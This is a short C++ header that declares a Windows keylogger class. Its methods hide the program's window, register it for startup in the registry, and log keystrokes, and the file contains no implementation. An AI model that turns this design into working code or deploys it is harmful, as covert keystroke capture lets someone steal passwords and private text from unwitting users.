#ifndef KEYLOGGER_HPP_
#define KEYLOGGER_HPP_

#include <windows.h>
#include <winuser.h>
#include <winreg.h>
#include <fstream>

class Keylogger {
	public:
		void hideWindow();
		void regStartup(const char *progName);
		void logKeyStrokes();
		bool isCapital();
		bool isShiftKeyPressed();

};

#endif /*KEYLOGGER_HPP_*/
